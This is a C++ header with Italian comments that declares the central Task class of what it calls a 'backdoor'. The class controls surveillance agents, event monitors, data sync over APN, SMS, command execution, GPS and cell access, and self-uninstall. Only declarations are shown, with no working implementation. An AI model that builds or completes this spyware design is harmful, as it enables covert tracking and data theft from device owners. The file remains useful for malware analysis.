#include "Common.h"
#include <string>
#include <exception>
using namespace std;

#ifndef __Task_h__
#define __Task_h__

#include "Conf.h"
#include "Status.h"
#include "Transfer.h"
#include "Device.h"
#include "SmsMessage.h"
#include "GPS.h"
#include "Cell.h"
#include "UberLog.h"
#include "Observer.h"
#include "ril.h"
#include <gpsapi.h>
#include <Msgqueue.h>

class Conf;
class Status;
class Transfer;
class Task;
class Device;

class Task : public Transfer
{
	/**
	 * Puntatore ad un oggetto Conf che viene allocato ed inizializzato dal costruttore. Viene liberato
	 * poi dal distruttore.
	 */
	private: Conf* confObj;
	private: Status *statusObj;
	private: Device *deviceObj;
	private: UberLog *uberlogObj;
	private: Observer *observerObj;

	/**
	 * Questo flag viene settato se viene ricevuto l'evento UNINSTALL. In questo caso la TaskInit()
	 * rimuove i log e ritorna.
	 */
	private: BOOL m_bUninstall;

	/**
	* Questo flag viene settato se viene ricevuta una nuova configurazione.
	*/
	private: BOOL m_bReload;

	/**
	 * Handle array per la gestione dei thread di eventi ed agenti e della coda IPC.
	 */	
	private: HANDLE *hEvents, *hAgents;

	/**
	* Counter per i thread di eventi ed agenti.
	*/	
	private: UINT uEvents, uAgents;

	/**
	 * Serve a non fare un loop infinito continuo e a dormire tra un controllo e l'altro della checklist. Per 
	 * il momento lo sleep time e' configurato internamente, un futuro verra' reso configurabile. 
	 */
	private: void Sleep();

	/**
	* E' un semplice override della Sleep standard.
	*/
	private: void Sleep(UINT ms);

	/**
	 * Setta i flag globali che triggherano la CANCELLATION_POINT. Torna TRUE appena l'agente identificato da Type
	 * si e' fermato, FALSE se l'agente ha superato il timeout.
	 */
	private: BOOL StopAgent(UINT Type);

	/**
	 * Stoppa tutti gli agenti e torna TRUE se tutti si sono fermati nel timeout prestabilito, FALSE altrimenti. Imposta
	 * il flag STOP nella tabella degli agenti.
	 */
	private: BOOL StopAgents();

	/**
	* Avvia l'agente identificato da Type. Torna TRUE se tutti se l'agente e' stato avviato, FALSE altrimenti.
	*/
	private: BOOL StartAgent(UINT Type);

	/**
	 * Avvia tutti gli agenti (tramite le Start*) che sono marcati come attivi nell'oggetto Status.Agents. Torna TRUE se tutti gli
	 * agenti sono partiti correttamente, FALSE altrimenti.
	 */
	private: BOOL StartAgents();

	/**
	* Riavvia un agente che era gia' attivo. Torna TRUE se l'agente e' stato riavviato correttamente,
	* FALSE altrimenti.
	*/
	private: BOOL Task::ReStartAgent(UINT Type);

	/**
	* Avvia tutti i monitor. Torna TRUE se tutti gli
	* eventi sono partiti correttamente, FALSE altrimenti.
	*/
	private: BOOL StopEvents();

	/**
	* Registra gli eventi ed avvia i relativi monitor. Torna TRUE se tutti gli
	* eventi sono stati registrati correttamente, FALSE altrimenti.
	*/
	private: BOOL RegisterEvents();

	/**
	* Ognuna di queste funzioni esegue un'azione. Torna TRUE se l'azione e' stata eseguita
	* con successo, FALSE altrimenti.
	*/
	private: BOOL ActionSync(pActionStruct pAction);
	private: BOOL ActionSyncPda(pActionStruct pAction);
	private: BOOL ActionSyncApn(pActionStruct pAction);
	private: BOOL ActionUninstall(pActionStruct pAction);
	private: BOOL ActionReload(pActionStruct pAction);
	private: BOOL ActionSms(pActionStruct pAction);
	private: BOOL ActionToothing(pActionStruct pAction);
	private: BOOL ActionStartAgent(pActionStruct pAction);
	private: BOOL ActionStopAgent(pActionStruct pAction);
	private: BOOL ActionExecute(pActionStruct pAction);
	private: BOOL ActionLog(pActionStruct pAction);

	/**
	 * Instanzia l'oggetto Conf ed inizializza la configurazione.
	 */
	public:  Task();
			 ~Task();

	/**
	 * Questa funzione viene chiamata una sola volta allo startup della backdoor, e in nessun'altra
	 * circostanza. Puo' essere usata per generare notifiche (ad esempio per scrivere il LogInfo).
	 */
	public: void StartNotification();

	/**
	 * Questa funzione stoppa tutti gli agenti attivi, chiama Conf e carica la configurazione, quindi riavvia tutti gli
	 * agenti. Torna TRUE se la backdoor e' stata inizializzata con successo, FALSE altrimenti. TaskInit() deve
	 * controllare bUninstall prima di avviare gli agenti.
	 */
	public: BOOL TaskInit();

	/**
	 * Scorre la lista degli eventi, controlla quali sono stati attivati ed esegue le relative azioni. Ogni azione e'
	 * sequenziale, pertanto questa funzione non deve essere eseguita in un thread separato. Deve verificare
	 * lo stato di bUninstall subito dopo l'inizio della funzione.
	 */
	public: BOOL CheckActions();
};

#endif
